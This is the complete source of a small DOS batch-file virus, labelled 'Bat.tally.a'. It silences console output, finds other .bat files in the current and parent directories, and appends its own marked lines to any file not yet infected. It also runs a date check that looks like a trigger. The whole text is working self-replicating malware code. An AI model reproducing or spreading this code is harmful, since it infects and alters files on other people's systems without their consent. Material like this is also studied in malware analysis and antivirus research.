:pero
:: [Bat.tally.a]
@echo off%tally%
@ctty nul.tally
for %%a in (*.bat ..\*.bat) do set tally=%%a
find "tally"<%tally%
if errorlevel 1 find  "tally"<%0.BAT>>%tally%
echo.|date|find "12">nul.tally
ctty con.tally
